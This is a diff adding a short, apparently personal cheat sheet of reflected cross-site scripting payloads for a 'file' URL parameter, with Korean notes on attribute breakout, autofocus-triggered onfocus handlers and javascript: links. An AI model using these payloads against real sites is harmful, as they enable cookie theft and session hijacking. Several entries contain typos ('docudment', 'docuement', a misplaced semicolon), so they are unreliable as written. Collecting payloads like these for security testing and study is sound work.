@@ -1,0 +1,22 @@
+Payload
+--------------------------
+-> HTML 영역 그대로 동작
+?file=<script>alert(document.cookie);</script>
+
+-> 앞의 태그를 닫고 새로운 스크립트 실행 추가
+?file="><script>alert(document.cookie);</script>
+
+-> 꺽쇠괄호가 인코딩 활용
+-> 사용자와의 상호작용없이 URL 접속할 때 바로 팝업이 뜨게 하려면 autofocus 활용
+?file="+onfocus%3Dalert(docudment.cookie;)+x%3D"
+?file="+onfocus%3Dalert(document.cookie;)+autofocus+x%3D"
+
+-> "Back"링크 클릭할 때, 스크립트 실행시킬 수 있음
+?file=test&previous=javascript:alert(docuement.cookie);
+
+
+"%3Balert(77)%3B%2F%2F
+</script><script>alert(77)</script>
+"-alert(77)-"
+"+alert(77)+"
+...
